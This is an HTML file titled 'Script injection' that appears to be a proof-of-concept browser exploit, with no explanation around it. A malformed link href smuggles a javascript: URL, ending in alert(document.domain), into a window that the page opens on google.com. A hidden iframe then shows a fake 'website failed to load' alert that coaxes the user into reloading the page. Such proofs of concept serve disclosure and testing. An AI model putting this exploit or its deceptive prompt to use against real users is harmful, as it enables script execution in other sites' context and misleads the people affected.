
<!DOCTYPE HTML>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, user-scalable=no">
	<title>Script injection</title>
	
	<style>
		iframe {
			visibility: hidden;
		}
	</style>
   
	<script>
		function redirect() {
			setTimeout(function() {
				window.open("https://google.com/load/", "win");
			}, 1500);
		}
   		
		window.onblur = function() {
			document.getElementById("iframe").src = "javascript:alert('Website failed to load. Please try reloading the page (You can do it by clicking on the URL bar and then on the Go/Enter button on the virtual keyboard).');";
		}
	</script>
</head>

<body>
   <center>
		<br>
		<h1><a href="o.o:@javascript:://google.com/error/%0Aalert(document.domain)//.https://google.com/load/webpage/133337" target="win" onclick="redirect();">Click here to go to https://google.com</a></h1>
	</center>
   <iframe id="iframe"></iframe>
</body>

</html>
